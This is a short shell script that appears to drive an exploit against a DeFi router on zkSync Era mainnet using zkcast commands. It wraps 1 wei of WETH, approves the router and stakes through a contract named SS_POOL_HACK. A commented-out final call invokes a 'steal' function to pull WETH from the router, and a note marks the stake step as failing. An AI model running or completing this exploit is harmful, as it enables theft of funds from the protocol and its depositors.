PK=
RPC=https://mainnet.era.zksync.io
CHAIN=324
SS_POOL_HACK=
WETH=0x5AEa5775959fBC2557Cc8789bC1bf90A239D9a91
../foundry-zksync/target/debug/zkcast zk-send $WETH "deposit()"  --rpc-url $RPC --private-key $PK --chain $CHAIN --value 1wei

SS_ROUTER=0x2da10A1e27bF85cEdD8FFb1AbBe97e53391C0295
../foundry-zksync/target/debug/zkcast zk-send $WETH "approve(address,uint)" $SS_ROUTER 1 --rpc-url $RPC --private-key $PK --chain $CHAIN

        #ss_router.stake(address(ss_hack), WETH, 1, address(this));
../foundry-zksync/target/debug/zkcast zk-send $SS_ROUTER "stake(address,address,uint,address)" $SS_POOL_HACK $WETH 1 $SS_POOL_HACK --rpc-url $RPC --private-key $PK --chain $CHAIN
# ^^ FAILS HERE

       # ss_hack.steal(address(ss_router), WETH);
#../foundry-zksync/target/debug/zkcast zk-send $SS_POOL_HACK "steal(address,address)" $SS_ROUTER $WETH --rpc-url $RPC --private-key $PK --chain $CHAIN